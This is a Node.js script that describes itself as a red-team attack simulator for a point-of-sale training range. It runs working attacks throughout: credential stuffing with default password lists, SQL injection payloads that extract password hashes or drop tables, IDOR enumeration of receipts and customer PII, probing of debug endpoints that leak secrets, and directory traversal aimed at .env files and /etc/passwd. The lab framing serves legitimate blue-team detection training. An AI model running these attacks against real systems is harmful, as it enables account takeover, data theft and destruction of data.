#!/usr/bin/env node

/**
 * Red Team Attack Simulation Script for POS Cyber-Range
 *
 * Simulates realistic attack patterns that the blue team should detect:
 *   - Credential stuffing / brute force login attempts
 *   - SQL injection probing
 *   - IDOR enumeration
 *   - Debug/info endpoint reconnaissance
 *   - Directory traversal attempts
 *
 * Usage:
 *   node scripts/simulate-attacks.js [options]
 *
 * Options:
 *   --base-url <url>     API base URL (default: http://localhost:4000)
 *   --attack <type>       Run a specific attack: brute-force, sqli, idor, recon, traversal, all
 *   --intensity <level>   Attack intensity: slow, normal, fast (default: normal)
 *   --verbose             Show detailed output
 */

const BASE_URL = getArg("--base-url") || "http://localhost:4000";
const ATTACK_TYPE = getArg("--attack") || "all";
const INTENSITY = getArg("--intensity") || "normal";
const VERBOSE = process.argv.includes("--verbose");

const DELAY_CONFIG = {
  slow: { min: 3000, max: 8000 },
  normal: { min: 500, max: 2000 },
  fast: { min: 100, max: 500 }
};

function getArg(name) {
  const idx = process.argv.indexOf(name);
  return idx !== -1 && idx + 1 < process.argv.length ? process.argv[idx + 1] : null;
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function delay(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function getDelay() {
  const cfg = DELAY_CONFIG[INTENSITY] || DELAY_CONFIG.normal;
  return randomInt(cfg.min, cfg.max);
}

function log(phase, msg) {
  const ts = new Date().toISOString().split("T")[1].split(".")[0];
  console.log(`[${ts}] [${phase}] ${msg}`);
}

async function request(path, options = {}) {
  const method = options.method || "GET";
  const headers = {
    "Content-Type": "application/json",
    "User-Agent": options.userAgent || "Mozilla/5.0 (RedTeam Simulation)",
    "X-Request-Id": `atk-${Date.now()}-${Math.random().toString(16).slice(2, 6)}`
  };

  if (options.cookies) {
    headers["Cookie"] = options.cookies;
  }
  if (options.csrfToken) {
    headers["X-CSRF-Token"] = options.csrfToken;
  }

  const fetchOptions = { method, headers };
  if (options.body) {
    fetchOptions.body = JSON.stringify(options.body);
  }

  try {
    const response = await fetch(`${BASE_URL}${path}`, fetchOptions);
    const contentType = response.headers.get("content-type") || "";
    const data = contentType.includes("json") ? await response.json() : await response.text();

    const setCookie = response.headers.getSetCookie?.() || [];
    const cookies = setCookie.map((c) => c.split(";")[0]).join("; ");

    return { status: response.status, data, cookies };
  } catch (err) {
    return { status: 0, data: null, error: err.message };
  }
}

//Credential Stuffing / Brute Force
async function attackBruteForce() {
  log("BRUTE", "=== Starting Credential Stuffing Attack ===");

  //Common username/password combinations
  const credentials = [
    { username: "admin", password: "admin" },
    { username: "admin", password: "password" },
    { username: "admin", password: "admin123" },
    { username: "admin", password: "Password1!" },
    { username: "admin", password: "letmein" },
    { username: "root", password: "root" },
    { username: "root", password: "toor" },
    { username: "administrator", password: "administrator" },
    { username: "svc_backup", password: "backup" },
    { username: "svc_backup", password: "backup2024!" },
    { username: "maintenance", password: "maintenance" },
    { username: "maintenance", password: "m@intenance" },
    { username: "test", password: "test" },
    { username: "user1", password: "user1" },
    { username: "user1", password: "password" },
    { username: "cashier", password: "cashier" },
    { username: "pos", password: "pos123" },
    { username: "manager", password: "manager" }
  ];

  //Get CSRF token first
  const csrfResult = await request("/api/auth/csrf");
  const csrfToken = csrfResult.data?.csrfToken;
  const cookies = csrfResult.cookies;

  let successes = 0;
  let failures = 0;

  for (const cred of credentials) {
    const result = await request("/api/auth/login", {
      method: "POST",
      body: { username: cred.username, password: cred.password },
      cookies,
      csrfToken
    });

    if (result.status === 200) {
      successes++;
      log("BRUTE", `SUCCESS: ${cred.username}:${cred.password}`);
      //Logout after successful login
      await request("/api/auth/logout", {
        method: "POST",
        cookies: result.cookies || cookies,
        csrfToken
      });
    } else if (result.status === 429) {
      log("BRUTE", `RATE LIMITED for ${cred.username} - attack detected!`);
    } else {
      failures++;
      if (VERBOSE) {
        log("BRUTE", `FAILED: ${cred.username}:${cred.password} (${result.status})`);
      }
    }

    await delay(getDelay());
  }

  log("BRUTE", `Results: ${successes} successes, ${failures} failures`);
  log("BRUTE", "=== Credential Stuffing Complete ===\n");
}

//SQL Injection Probing
async function attackSQLi() {
  log("SQLI", "=== Starting SQL Injection Probing ===");

  //Authenticate
  const csrfResult = await request("/api/auth/csrf");
  const loginResult = await request("/api/auth/login", {
    method: "POST",
    body: { username: "user1", password: "user1" },
    cookies: csrfResult.cookies,
    csrfToken: csrfResult.data?.csrfToken
  });

  if (loginResult.status !== 200) {
    log("SQLI", "Could not authenticate. Trying without auth...");
  }

  const cookies = loginResult.cookies || csrfResult.cookies;

  const payloads = [
    // SQL injection
    "' OR 1=1--",
    "' OR '1'='1",
    "'; DROP TABLE Product;--",
    // Union-based injection to extract user data
    "' UNION SELECT username,passwordHash,role,1,1,1 FROM User--",
    "' UNION SELECT id,username,passwordHash,role,1,1 FROM User--",
    // Error-based injection
    "' AND 1=CONVERT(int,(SELECT TOP 1 username FROM User))--",
    // Time-based blind injection
    "' OR SLEEP(2)--",
    // Stacked queries
    "'; SELECT * FROM User;--",
    // Simple tautology
    "admin'--",
    "1' OR '1'='1"
  ];

  let errors = 0;
  let successes = 0;

  for (const payload of payloads) {
    const encoded = encodeURIComponent(payload);
    const result = await request(`/api/reports/products?q=${encoded}`, { cookies });

    if (result.status === 200) {
      const items = result.data?.items || [];
      if (items.length > 0) {
        successes++;
        log("SQLI", `INJECTABLE: q=${payload} returned ${items.length} rows`);
        if (VERBOSE && items.length > 0) {
          log("SQLI", `  Sample: ${JSON.stringify(items[0])}`);
        }
      }
    } else if (result.status === 500) {
      errors++;
      if (VERBOSE) {
        log("SQLI", `ERROR (may indicate injection point): q=${payload}`);
        log("SQLI", `  Response: ${JSON.stringify(result.data)}`);
      }
    }

    await delay(getDelay());
  }

  //try the sales report endpoint
  const salesPayloads = [
    "2024-01-01' UNION SELECT username,passwordHash,role,1 FROM User--",
    "' OR 1=1--"
  ];

  for (const payload of salesPayloads) {
    const result = await request(`/api/reports/sales?startDate=${encodeURIComponent(payload)}`, { cookies });
    if (result.status === 200) {
      log("SQLI", `Sales endpoint injectable with: ${payload}`);
    }
    await delay(getDelay());
  }

  log("SQLI", `Results: ${successes} successful injections, ${errors} errors`);
  log("SQLI", "=== SQL Injection Probing Complete ===\n");
}

//IDOR Enumeration
async function attackIDOR() {
  log("IDOR", "=== Starting IDOR Enumeration ===");

  // Login as a regular cashier
  const csrfResult = await request("/api/auth/csrf");
  const loginResult = await request("/api/auth/login", {
    method: "POST",
    body: { username: "user2", password: "user2" },
    cookies: csrfResult.cookies,
    csrfToken: csrfResult.data?.csrfToken
  });

  const cookies = loginResult.cookies || csrfResult.cookies;
  let found = 0;

  //Enumerate receipts/orders by sequential IDs
  log("IDOR", "Enumerating receipts 1-20...");
  for (let id = 1; id <= 20; id++) {
    const result = await request(`/api/receipts/${id}`, { cookies });
    if (result.status === 200 && result.data?.receipt) {
      found++;
      const r = result.data.receipt;
      log("IDOR", `Receipt #${id}: $${(r.totalCents / 100).toFixed(2)} by ${r.cashier?.username} | Customer: ${r.customer?.name || "none"}`);
    }
    await delay(randomInt(200, 500));
  }

  //Enumerate customer data
  log("IDOR", "Searching customer PII...");
  const searchTerms = ["@example.com", "555-", "a", "e", "i"];
  for (const term of searchTerms) {
    const result = await request(`/api/receipts/customers/lookup?email=${encodeURIComponent(term)}`, { cookies });
    if (result.status === 200 && result.data?.customers?.length > 0) {
      for (const customer of result.data.customers) {
        log("IDOR", `Customer: ${customer.name} | ${customer.email} | ${customer.phone} | Payment methods: ${customer.paymentMethods?.length || 0}`);
      }
    }
    await delay(getDelay());
  }

  log("IDOR", `Found ${found} accessible receipts via IDOR`);
  log("IDOR", "=== IDOR Enumeration Complete ===\n");
}

//Reconnaissance - Debug Endpoints
async function attackRecon() {
  log("RECON", "=== Starting Reconnaissance ===");

  // Try debug endpoint without auth
  log("RECON", "Probing /api/debug/info (no auth)...");
  const infoResult = await request("/api/debug/info");
  if (infoResult.status === 200) {
    log("RECON", "DEBUG INFO EXPOSED (no auth required!)");
    if (VERBOSE) {
      log("RECON", JSON.stringify(infoResult.data, null, 2));
    } else {
      const d = infoResult.data;
      log("RECON", `  Hostname: ${d?.system?.hostname}`);
      log("RECON", `  Platform: ${d?.system?.platform} ${d?.system?.arch}`);
      log("RECON", `  Node: ${d?.process?.nodeVersion}`);
      log("RECON", `  DB: ${d?.database?.provider} @ ${d?.database?.url}`);
      log("RECON", `  CSRF: ${d?.security?.csrfEnabled}, RateLimit: ${d?.security?.rateLimitEnabled}`);
      log("RECON", `  Session secret prefix: ${d?.security?.sessionSecret}`);
    }
  }

  await delay(getDelay());

  // Try authenticated debug endpoints
  const csrfResult = await request("/api/auth/csrf");
  const loginResult = await request("/api/auth/login", {
    method: "POST",
    body: { username: "user1", password: "user1" },
    cookies: csrfResult.cookies,
    csrfToken: csrfResult.data?.csrfToken
  });
  const cookies = loginResult.cookies || csrfResult.cookies;

  log("RECON", "Probing /api/debug/config (auth, no admin)...");
  const configResult = await request("/api/debug/config", { cookies });
  if (configResult.status === 200) {
    log("RECON", "FULL CONFIG EXPOSED to non-admin user!");
    if (VERBOSE) {
      log("RECON", JSON.stringify(configResult.data, null, 2));
    }
  }

  log("RECON", "Probing /api/debug/users (password hashes)...");
  const usersResult = await request("/api/debug/users", { cookies });
  if (usersResult.status === 200) {
    log("RECON", "USER DATA WITH PASSWORD HASHES EXPOSED!");
    for (const u of usersResult.data?.users || []) {
      log("RECON", `  ${u.username} (${u.role}): ${u.passwordHash?.substring(0, 20)}...`);
    }
  }

  log("RECON", "=== Reconnaissance Complete ===\n");
}

//Directory Traversal
async function attackTraversal() {
  log("TRAVERSAL", "=== Starting Directory Traversal ===");

  const csrfResult = await request("/api/auth/csrf");
  const loginResult = await request("/api/auth/login", {
    method: "POST",
    body: { username: "user1", password: "user1" },
    cookies: csrfResult.cookies,
    csrfToken: csrfResult.data?.csrfToken
  });
  const cookies = loginResult.cookies || csrfResult.cookies;

  const traversalPaths = [
    "../.env",
    "../../.env",
    "../../../.env",
    "../package.json",
    "../../package.json",
    "../prisma/schema.prisma",
    "../sessions/sessions.db",
    "..%2F.env",
    "..%2F..%2F.env",
    "....//....//....//etc/passwd"
  ];

  for (const traversal of traversalPaths) {
    const result = await request(`/api/debug/export/${traversal}`, { cookies });

    if (result.status === 200) {
      log("TRAVERSAL", `FILE READ: ${traversal}`);
      if (VERBOSE && typeof result.data === "string") {
        log("TRAVERSAL", `  Content (first 200 chars): ${result.data.substring(0, 200)}`);
      }
    } else if (result.status === 404) {
      if (VERBOSE) {
        log("TRAVERSAL", `Not found: ${traversal} (path: ${result.data?.path || "?"})`);
      }
    } else if (result.status === 500) {
      log("TRAVERSAL", `Error reading ${traversal}: ${result.data?.error || "unknown"}`);
    }

    await delay(getDelay());
  }

  log("TRAVERSAL", "=== Directory Traversal Complete ===\n");
}

// Main
async function main() {
  console.log(`=== POS Red Team Attack Simulator ===`);
  console.log(`Target:    ${BASE_URL}`);
  console.log(`Attack:    ${ATTACK_TYPE}`);
  console.log(`Intensity: ${INTENSITY}`);
  console.log(`=====================================\n`);

  const attacks = {
    "brute-force": attackBruteForce,
    "sqli": attackSQLi,
    "idor": attackIDOR,
    "recon": attackRecon,
    "traversal": attackTraversal
  };

  if (ATTACK_TYPE === "all") {
    for (const [name, fn] of Object.entries(attacks)) {
      await fn();
      await delay(2000);
    }
  } else if (attacks[ATTACK_TYPE]) {
    await attacks[ATTACK_TYPE]();
  } else {
    console.error(`Unknown attack type: ${ATTACK_TYPE}`);
    console.error(`Available: ${Object.keys(attacks).join(", ")}, all`);
    process.exitCode = 1;
  }

  console.log("Attack simulation complete.");
}

main().catch((err) => {
  console.error("Attack simulation crashed:", err);
  process.exitCode = 1;
});
